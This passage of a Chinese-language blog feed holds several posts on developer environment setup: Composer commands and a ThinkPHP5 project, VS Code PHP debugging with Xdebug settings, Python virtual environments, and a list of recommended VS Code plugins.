文件到最新版本。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar self-update</code></pre></div><p>如果你想要升级到一个特定的版本，可以这样简单的指定它：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar self-update 1.0.0-alpha7</code></pre></div><p>如果你已经为整个系统安装 Composer（参见 <a href="https://docs.phpcomposer.com/00-intro.html#%E5%85%A8%E5%B1%80%E5%AE%89%E8%A3%85">全局安装</a>），你可能需要在 <code>root</code> 权限下运行它：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sudo composer self-update</code></pre></div><h4 id="自我更新-参数"><a href="#自我更新-参数" class="headerlink" title="自我更新-参数"></a>自我更新-参数</h4><ul><li><strong>–rollback (-r):</strong> 回滚到你已经安装的最后一个版本。</li><li><strong>–clean-backups:</strong> 在更新过程中删除旧的备份，这使得更新过后的当前版本是唯一可用的备份。</li></ul><h4 id="创建项目-create-project"><a href="#创建项目-create-project" class="headerlink" title="创建项目 create-project"></a>创建项目 <code>create-project</code></h4><p>你可以使用 Composer 从现有的包中创建一个新的项目。这相当于执行了一个 <code>git clone</code> 或 <code>svn checkout</code> 命令后将这个包的依赖安装到它自己的 vendor 目录。</p><p>此命令有几个常见的用途：</p><ol><li>你可以快速的部署你的应用。</li><li>你可以检出任何资源包，并开发它的补丁。</li><li>多人开发项目，可以用它来加快应用的初始化。</li></ol><p>要创建基于 Composer 的新项目，你可以使用 “create-project” 命令。传递一个包名，它会为你创建项目的目录。你也可以在第三个参数中指定版本号，否则将获取最新的版本。</p><p>如果该目录目前不存在，则会在安装过程中自动创建。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar create-project doctrine/orm path 2.2.*</code></pre></div><p>此外，你也可以无需使用这个命令，而是通过现有的 <code>composer.json</code> 文件来启动这个项目。</p><p>默认情况下，这个命令会在 packagist.org 上查找你指定的包。</p><h4 id="创建项目-参数"><a href="#创建项目-参数" class="headerlink" title="创建项目-参数"></a>创建项目-参数</h4><ul><li><strong>–repository-url:</strong> 提供一个自定义的储存库来搜索包，这将被用来代替 packagist.org。可以是一个指向 <code>composer</code> 资源库的 HTTP URL，或者是指向某个 <code>packages.json</code> 文件的本地路径。</li><li><strong>–stability (-s):</strong> 资源包的最低稳定版本，默认为 <code>stable</code>。</li><li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li><li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li><li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包。</li><li><strong>–no-install:</strong> 禁止安装包的依赖。</li><li><strong>–no-plugins:</strong> 禁用 plugins。</li><li><strong>–no-scripts:</strong> 禁止在根资源包中定义的脚本执行。</li><li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li><li><strong>–keep-vcs:</strong> 创建时跳过缺失的 VCS 。如果你在非交互模式下运行创建命令，这将是非常有用的。</li></ul><h3 id="composer-json语法"><a href="#composer-json语法" class="headerlink" title="composer.json语法"></a>composer.json语法</h3><p>具体可参考：<a href="https://getcomposer.org/doc/04-schema.md">The composer.json schema</a></p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;$schema&quot;</span>: <span class="hljs-string">&quot;https://json-schema.org/draft-04/schema#&quot;</span>,    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Package&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;object&quot;</span>,    <span class="hljs-attr">&quot;additionalProperties&quot;</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">&quot;required&quot;</span>: [ <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;description&quot;</span> ],    <span class="hljs-attr">&quot;properties&quot;</span>: &#123;    <span class="hljs-attr">&quot;name&quot;</span>: &#123;...        &#125;,    &quot;description&quot;: &#123;...        &#125;,    &quot;version&quot;: &#123;...        &#125;,    &quot;type&quot;: &#123;...        &#125;,    &quot;keywords&quot;: &#123;...        &#125;,    &quot;homepage&quot;: &#123;...        &#125;,    &quot;readme&quot;: &#123;...        &#125;,    &quot;time&quot;: &#123;...        &#125;,    &quot;license&quot;: &#123;...        &#125;,    &quot;authors&quot;: &#123;...        &#125;,    &quot;support&quot;: &#123;...        &#125;,    &quot;funding&quot;: &#123;...        &#125;,    &#125;&#125;</code></pre></div><p>下面是一份thinkphp的</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;topthink/think&quot;</span>,    <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;the new thinkphp framework&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;project&quot;</span>,    <span class="hljs-attr">&quot;keywords&quot;</span>: [        <span class="hljs-string">&quot;framework&quot;</span>,        <span class="hljs-string">&quot;thinkphp&quot;</span>,        <span class="hljs-string">&quot;ORM&quot;</span>    ],    <span class="hljs-attr">&quot;homepage&quot;</span>: <span class="hljs-string">&quot;http://thinkphp.cn/&quot;</span>,    <span class="hljs-attr">&quot;license&quot;</span>: <span class="hljs-string">&quot;Apache-2.0&quot;</span>,    <span class="hljs-attr">&quot;authors&quot;</span>: [        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;liu21st&quot;</span>,            <span class="hljs-attr">&quot;email&quot;</span>: <span class="hljs-string">&quot;liu21st@gmail.com&quot;</span>        &#125;    ],    <span class="hljs-attr">&quot;require&quot;</span>: &#123;        <span class="hljs-attr">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.4.0&quot;</span>,        <span class="hljs-attr">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.0.*&quot;</span>    &#125;,    <span class="hljs-attr">&quot;autoload&quot;</span>: &#123;        <span class="hljs-attr">&quot;psr-4&quot;</span>: &#123;            <span class="hljs-attr">&quot;app\\&quot;</span>: <span class="hljs-string">&quot;application&quot;</span>        &#125;    &#125;,    <span class="hljs-attr">&quot;extra&quot;</span>: &#123;        <span class="hljs-attr">&quot;think-path&quot;</span>: <span class="hljs-string">&quot;thinkphp&quot;</span>    &#125;,    <span class="hljs-attr">&quot;config&quot;</span>: &#123;        <span class="hljs-attr">&quot;preferred-install&quot;</span>: <span class="hljs-string">&quot;dist&quot;</span>    &#125;&#125;</code></pre></div><h3 id="vscode-composer插件"><a href="#vscode-composer插件" class="headerlink" title="vscode composer插件"></a>vscode composer插件</h3><p>此插件为PHP的Composer依赖关系管理器提供了一个接口。 它还为composer.json配置文件提供语法验证。</p><h2 id="Composer搭建Thinkphp5"><a href="#Composer搭建Thinkphp5" class="headerlink" title="Composer搭建Thinkphp5"></a>Composer搭建Thinkphp5</h2><p>切换到你的web根目录下面并执行下面的命令：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">composer create-project topthink/think=5.0.* tp5  --prefer-dist</code></pre></div><p>访问：</p><p><a href="http://localhost/tp5/public/">http://localhost/tp5/public/</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://docs.phpcomposer.com/">Composer中文文档</a></li><li><a href="http://www.thinkphp.cn/topic/52362.html">史上最详细的Composer安装tp5教程</a></li><li><a href="https://www.kancloud.cn/manual/thinkphp5">ThinkPHP5.0完全开发手册</a></li><li><a href="https://getcomposer.org/doc/04-schema.md">The composer.json schema</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Composer-快速搭建thinkphp环境&quot;&gt;&lt;a href=&quot;#Composer-快速搭建thinkphp环境&quot; class=&quot;headerlink&quot; title=&quot;Composer 快速搭建thinkphp环境&quot;&gt;&lt;/a&gt;Composer 快速搭建thin</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="thinkphp" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/thinkphp/"/>
    
    
    <category term="thinkphp" scheme="https://greydr34d.github.io/tags/thinkphp/"/>
    
    <category term="composer" scheme="https://greydr34d.github.io/tags/composer/"/>
    
  </entry>
  
  <entry>
    <title>Vs Code PHP调试环境配置</title>
    <link href="https://greydr34d.github.io/2021/01/07/Vs-Code-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://greydr34d.github.io/2021/01/07/Vs-Code-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2021-01-07T03:29:03.000Z</published>
    <updated>2021-01-10T12:08:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vs-Code配置PHP开发环境-xdebug调试"><a href="#Vs-Code配置PHP开发环境-xdebug调试" class="headerlink" title="Vs Code配置PHP开发环境+xdebug调试"></a>Vs Code配置PHP开发环境+xdebug调试</h1><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p><strong>PHP Intelephense</strong></p><p>PHP 的代码提示、补全、跳转定义、格式化插件，功能强大，无需配置</p><p><strong>PHP DocBlocker</strong></p><p>注释自动生成器，/** 回车</p><p><strong>PHP Namespace Resolver</strong></p><p>PHP 命名空间解析器；可以导入和扩展类；还可以排序。</p><p><strong>PHP debug</strong></p><h2 id="配置Vs-code"><a href="#配置Vs-code" class="headerlink" title="配置Vs code"></a>配置Vs code</h2><p>快捷键Ctrl+Shift+P,输入setting,打开设置</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183058279.png" alt="img"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183129939.png" alt="img"></p><p>配置PHP可执行文件路径，linux下也是一样。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183225969.png" alt="img"></p><p>设置完毕后,来到调试界面,首次调试的时候需要点击齿轮按钮自动生成运行方案,默认的配置就行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183439787.png" alt="img"></p><h2 id="php-xdebug-安装"><a href="#php-xdebug-安装" class="headerlink" title="php-xdebug 安装"></a>php-xdebug 安装</h2><p>php需要安装xdebug扩展，根据自己的php版本来选即可</p><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-cache search php | grep xdebugphp -v</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107152716532.png" alt="image-20210107152716532"></p><h2 id="php配置修改"><a href="#php配置修改" class="headerlink" title="php配置修改"></a>php配置修改</h2><p>安装好xdebug扩展后，还需要修改配置文件</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/php/7.4/apache2/conf.dll</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107153018103.png" alt="image-20210107153018103"></p><p>可以看到php-xdebug的配置文件。</p><p>我的配置如下：</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so<span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM<span class="hljs-attr">xdebug.default_enable</span>=<span class="hljs-number">1</span></code></pre></div><p>补充：</p><p>Xdebug从2.0到3.0在配置上发生了变化，老的教程配置可能是下面这样</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<span class="hljs-attr">xdebug.idekey</span>=PHPSTORM</code></pre></div><p><a href="https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug">PHP Debug Adapter for Visual Studio Code</a> 一文中对3.xx版本的xdebug配置变化进行了说明：</p><blockquote><p>Enable remote debugging in your <code>php.ini</code>:</p><p>For XDebug v3.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.mode</span> = debug<span class="hljs-attr">xdebug.start_with_request</span> = <span class="hljs-literal">yes</span><span class="hljs-attr">xdebug.client_port</span> = <span class="hljs-number">9000</span></code></pre></div><p>For XDebug v2.x.x:</p><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_autostart</span> = <span class="hljs-number">1</span></code></pre></div></blockquote><h2 id="浏览器配置Xdebug-helper"><a href="#浏览器配置Xdebug-helper" class="headerlink" title="浏览器配置Xdebug helper"></a>浏览器配置Xdebug helper</h2><p>在google和firefix插件搜索Xdebug helper，安装即可。<br>配置一下IDE Key<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107153718107.png" alt="image-20210107153718107"></p><h2 id="f5调试"><a href="#f5调试" class="headerlink" title="f5调试"></a>f5调试</h2><p>按f5，选择Listen for xdebug就可以了</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/lpwmm/article/details/86369205">Visual Studio Code配置PHP 7.3开发环境+xdebug调试</a></li><li><a href="https://m.php.cn/tool/vscode/430435.html">vscode php 插件</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vs-Code配置PHP开发环境-xdebug调试&quot;&gt;&lt;a href=&quot;#Vs-Code配置PHP开发环境-xdebug调试&quot; class=&quot;headerlink&quot; title=&quot;Vs Code配置PHP开发环境+xdebug调试&quot;&gt;&lt;/a&gt;Vs Code配置PH</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="vscode" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/vscode/"/>
    
    
    <category term="vscode" scheme="https://greydr34d.github.io/tags/vscode/"/>
    
    <category term="php" scheme="https://greydr34d.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Vs Code Python开发环境配置</title>
    <link href="https://greydr34d.github.io/2021/01/07/Vs-Code-Python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://greydr34d.github.io/2021/01/07/Vs-Code-Python%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2021-01-07T03:28:50.000Z</published>
    <updated>2021-01-10T12:10:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vs-Code-Python开发环境配置"><a href="#Vs-Code-Python开发环境配置" class="headerlink" title="Vs Code Python开发环境配置"></a>Vs Code Python开发环境配置</h1><h2 id="安装扩展"><a href="#安装扩展" class="headerlink" title="安装扩展"></a>安装扩展</h2><blockquote><p>单击VSCode左侧菜单栏-Extension图标，输入Python进行搜索，在下方的Python扩展程序中点击安装即可。</p><p>选择编译器，Ctrl+Shift+P，键入Python: Select Interpreter，选择相应安装好的Python解释器</p><p>安装Linter,一般来说完成扩展的安装后，会出现提示Linter pylint is not installed 的信息，点击安装即可。这个是用来提示错误信息的。</p></blockquote><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><blockquote><p>选择一个文件夹，建立扩展名为py的Python脚本文件，就可以运行程序了<br>按F5</p></blockquote><h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><p>创建虚拟环境前需要安装virtualenv库</p><p>依次运行如下命令：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">pip install virtualenvvirtualenv venv --python=python2.7 或者 python -m venv .venv./venv/Scripts/activate.ps1</code></pre></div><p>要选择特定的环境，请使用Python：从命令面板（Ctrl + Shift + P）中选择“解释器”命令。<br><img src="https://code.visualstudio.com/assets/docs/python/environments/select-interpreters-command.png" alt="img"></p><p>Python：选择解释器命令</p><p>“ Python：选择解释器”命令显示可用的全局环境，conda环境和虚拟环境的列表.</p><p>例如，下图显示了多个Anaconda和CPython安装以及位于其中的conda环境和虚拟环境（env）。工作区文件夹：</p><p><img src="https://code.visualstudio.com/assets/docs/python/environments/interpreters-list.png" alt="img"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/u012604810/article/details/82924591">VSCode编译、调试Python(Python in VSCode)</a></li><li><a href="https://code.visualstudio.com/docs/python/environments">Using Python environments in VS Code</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vs-Code-Python开发环境配置&quot;&gt;&lt;a href=&quot;#Vs-Code-Python开发环境配置&quot; class=&quot;headerlink&quot; title=&quot;Vs Code Python开发环境配置&quot;&gt;&lt;/a&gt;Vs Code Python开发环境配置&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="vscode" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/vscode/"/>
    
    
    <category term="vscode" scheme="https://greydr34d.github.io/tags/vscode/"/>
    
    <category term="python" scheme="https://greydr34d.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Vs Code插件推荐</title>
    <link href="https://greydr34d.github.io/2021/01/07/Vs-Code%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <id>https://greydr34d.github.io/2021/01/07/Vs-Code%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</id>
    <published>2021-01-07T03:28:23.000Z</published>
    <updated>2021-01-07T06:30:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VS-Code-插件推荐"><a href="#VS-Code-插件推荐" class="headerlink" title="VS Code 插件推荐"></a>VS Code 插件推荐</h1><p>前言：本文主要内容转载于<a href="https://github.com/qianguyihao/Web%EF%BC%8C%E6%84%9F%E8%B0%A2%E5%8D%83%E5%8F%A4%E5%A3%B9%E5%8F%B7%E7%9A%84%E5%88%86%E4%BA%AB%EF%BC%8C%E7%84%B6%E6%88%91%E8%83%BD%E5%A4%9F%E9%9D%9E%E5%B8%B8%E9%A1%BA%E5%88%A9%E7%9A%84%E5%85%A5%E5%9D%91vscode%E3%80%82">https://github.com/qianguyihao/Web，感谢千古壹号的分享，然我能够非常顺利的入坑vscode。</a></p><p>对于主要做前端的师傅来说，<a href="https://github.com/qianguyihao/Web%E5%8E%9F%E6%96%87%E7%9A%84%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E9%9D%9E%E5%B8%B8%E5%85%A8%E9%9D%A2%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E5%8F%AA%E6%8C%91%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B9%B3%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A4%9A%E7%9A%84%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%E3%80%82">https://github.com/qianguyihao/Web原文的插件推荐非常全面，这里我只挑了一些平常用的多的进行记录。</a></p><h2 id="1、GitLens"><a href="#1、GitLens" class="headerlink" title="1、GitLens"></a>1、GitLens</h2><p>Git 神器</p><p>GitLens 在 Git 管理上有很多强大的功能，比如：</p><ul><li>将光标放置在代码的当前行，可以看到这样代码的提交者是谁，以及提交时间。这一点，是 GitLens 最便捷的功能。</li><li>查看某个 commit 的代码改动记录</li><li>查看不同的分支</li><li>可以将两个 commit 进行代码对比</li><li>甚至可以将两个 branch 分支进行整体的代码对比。这一点，简直是 GitLens 最强大的功能。当我们在不同分支 review 代码的时候，就可以用到这一招。</li></ul><h2 id="2、Chinese-Simplified-Language-Pack-for-Visual-Studio-Code"><a href="#2、Chinese-Simplified-Language-Pack-for-Visual-Studio-Code" class="headerlink" title="2、Chinese (Simplified) Language Pack for Visual Studio Code"></a>2、Chinese (Simplified) Language Pack for Visual Studio Code</h2><p>让软件显示为简体中文语言。</p><h2 id="3、sftp：文件传输"><a href="#3、sftp：文件传输" class="headerlink" title="3、sftp：文件传输"></a>3、sftp：文件传输</h2><p>如果你需要将本地文件通过 ftp 的形式上传到局域网的服务器，可以安装<code>sftp</code>这个插件，很好用。在公司会经常用到。</p><h2 id="4、vscode-icons"><a href="#4、vscode-icons" class="headerlink" title="4、vscode-icons"></a>4、vscode-icons</h2><p>vscode-icons 会根据文件的后缀名来显示不同的图标，让你更直观地知道每种文件是什么类型的。</p><h2 id="5、Markdown-Preview-Github-Styling"><a href="#5、Markdown-Preview-Github-Styling" class="headerlink" title="5、Markdown Preview Github Styling"></a>5、Markdown Preview Github Styling</h2><p>以 GitHub 风格预览 Markdown 样式，十分简洁优雅。就像下面这样，左侧书写 Markdown 文本，右侧预览 Markdown 的渲染效果：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200618_2025.png"></p><h2 id="6、Markdown-All-in-One"><a href="#6、Markdown-All-in-One" class="headerlink" title="6、Markdown All in One"></a>6、Markdown All in One</h2><p>这个插件将帮助你更高效地在 Markdown 中编写文档。</p><h2 id="7、Settings-Sync"><a href="#7、Settings-Sync" class="headerlink" title="7、Settings Sync"></a>7、Settings Sync</h2><ul><li>多台设备之间，同步 VS Code 配置。</li></ul><p>配置步骤上面说过了。</p><h2 id="8、Prettier：代码格式化"><a href="#8、Prettier：代码格式化" class="headerlink" title="8、Prettier：代码格式化"></a>8、Prettier：代码格式化</h2><p>Prettier 是一个代码格式化工具，只关注格式化，但不具备校验功能。在一个多人协同开发的团队中，统一的代码编写规范非常重要。一套规范可以让我们编写的代码达到一致的风格，提高代码的可读性和统一性。自然维护性也会有所提高。</p><h2 id="9、Beautify"><a href="#9、Beautify" class="headerlink" title="9、Beautify"></a>9、Beautify</h2><p>代码格式化工具。也挺好用</p><p>备注：相比之下，Prettier 是当前最流行的代码格式化工具，比 Beautify 用得更多。</p><h2 id="10、Polacode-2020：生成代码截图-【荐】"><a href="#10、Polacode-2020：生成代码截图-【荐】" class="headerlink" title="10、Polacode-2020：生成代码截图 【荐】"></a>10、Polacode-2020：生成代码截图 【荐】</h2><p>可以把代码片段保存成美观的图片，主题不同，代码的配色方案也不同，也也可以自定义设置图片的边框颜色、大小、阴影。</p><p>尤其是在我们做 PPT 分享时需要用到代码片段时，或者需要在网络上优雅地分享代码片段时，这一招很有用。</p><p>生成的效果如下：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200619_1403.png"></p><h2 id="11、Docker"><a href="#11、Docker" class="headerlink" title="11、Docker"></a>11、Docker</h2><p>Docker扩展使从Visual Studio Code轻松构建，管理和部署容器化应用程序变得容易。 它还提供了在容器内对Node.js，Python和.NET Core的一键式调试。</p><p><img src="https://github.com/microsoft/vscode-docker/raw/master/resources/readme/overview.gif" alt="Docker extension overview"></p><h2 id="12、Google-Translate"><a href="#12、Google-Translate" class="headerlink" title="12、Google Translate"></a>12、Google Translate</h2><p>翻译插件，虽然star没有vscode Google translate高，但是感觉查询速度更快。</p><p>快捷键 <code>Ctrl + Shift + T</code>.</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106233909231.png" alt="image-20210106233909231"></p><h2 id="13、PHP-Debug"><a href="#13、PHP-Debug" class="headerlink" title="13、PHP Debug"></a>13、PHP Debug</h2><p>php调试必须要安装的插件，具体的php+xdebuger的调试环境会在后面介绍。</p><h2 id="14、PHP-Intelephense"><a href="#14、PHP-Intelephense" class="headerlink" title="14、PHP Intelephense"></a>14、PHP Intelephense</h2><p>PHP语法支持</p><h2 id="15、Project-Manager"><a href="#15、Project-Manager" class="headerlink" title="15、Project Manager"></a><strong>15、Project Manager</strong></h2><p>强烈推荐，管理项目非常方便，再也不用频繁的创建新窗口在打开文件夹了，使用Project Manager可以直接在不同项目间切换。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106234504319.png" alt="image-20210106234504319"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210106234442141.png" alt="image-20210106234442141"></p><h2 id="16、Remote-SSH"><a href="#16、Remote-SSH" class="headerlink" title="16、Remote - SSH"></a>16、Remote - SSH</h2><p>远程管理的利器</p><h2 id="17、vscode-drawio"><a href="#17、vscode-drawio" class="headerlink" title="17、vscode-drawio"></a>17、vscode-drawio</h2><p>vscode里也可以画流程图，太帅了</p><h2 id="18、XML-Formatter"><a href="#18、XML-Formatter" class="headerlink" title="18、XML Formatter"></a>18、XML Formatter</h2><p>XML文件的格式化插件</p><h2 id="19、Go"><a href="#19、Go" class="headerlink" title="19、Go"></a>19、Go</h2><p>golang支持</p><h2 id="20、Node-Debug"><a href="#20、Node-Debug" class="headerlink" title="20、Node Debug"></a>20、Node Debug</h2><p>vscode中调试nodejs的必备插件</p><h2 id="21、Python"><a href="#21、Python" class="headerlink" title="21、Python"></a>21、Python</h2><p>python插件怎么能忘，切换python版本，python虚拟环境的搭建后面进行介绍</p><p><img src="https://raw.githubusercontent.com/microsoft/vscode-python/main/images/InterpreterSelectionZoom.gif" alt="img"></p><h2 id="22、Zhihu-On-VSCode"><a href="#22、Zhihu-On-VSCode" class="headerlink" title="22、Zhihu On VSCode"></a>22、Zhihu On VSCode</h2><p>摸鱼插件哈哈</p><h2 id="常见主题插件"><a href="#常见主题插件" class="headerlink" title="常见主题插件"></a>常见主题插件</h2><p>给你的 VS Code 换个皮肤吧，免费的那种。我个人使用的是Dracula Theme </p><ul><li><p>Dracula Theme </p></li><li><p>Material Theme</p></li><li><p>Nebula Theme</p></li><li><p><a href="https://marketplace.visualstudio.com/items?itemName=zhuangtongfa.Material-theme">One Dark Pro</a></p></li><li><p>One Monokai Theme</p></li><li><p>Monokai Pro</p></li><li><p>Ayu</p></li></ul><ul><li><p><a href="https://marketplace.visualstudio.com/items?itemName=akarlsten.vscode-snazzy-akarlsten">Snazzy Plus</a></p></li><li><p><a href="https://marketplace.visualstudio.com/items?itemName=alexanderte.dainty-vscode">Dainty</a></p></li><li><p><code>SynthWave &#39;84</code></p></li></ul><ul><li>GitHub Plus Theme：白色主题</li><li>Horizon Theme：红色主题</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/qianguyihao/Web">https://github.com/qianguyihao/Web</a></li><li><a href="https://thedarkbay797951995.wordpress.com/2020/08/15/install-vs-code-in-kali-linux/">Install Visual Studio Code (VS Code) Editor in Kali linux</a></li><li><a href="https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug">PHP Debug Adapter for Visual Studio Code</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VS-Code-插件推荐&quot;&gt;&lt;a href=&quot;#VS-Code-插件推荐&quot; class=&quot;headerlink&quot; title=&quot;VS Code 插件推荐&quot;&gt;&lt;/a&gt;VS Code 插件推荐&lt;/h1&gt;&lt;p&gt;前言：本文主要内容转载于&lt;a href=&quot;https://g</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="vscode" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/vscode/"/>
    
    
    <category term="vscode" scheme="https://greydr34d.github.io/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>Vs Code配置云同步</title>
    <link href="https://greydr34d.github.io/2021/01/07/Vs-Code%E9%85%8D%E7%BD%AE%E4%BA%91%E5%90%8C%E6%AD%A5/"/>
    <id>https://greydr34d.github.io/2021/01/07/Vs-Code%E9%85%8D%E7%BD%AE%E4%BA%91%E5%90%8C%E6%AD%A5/</id>
    <published>2021-01-07T03:27:57.000Z</published>
    <updated>2021-01-07T06:30:54.000Z</updated>
    
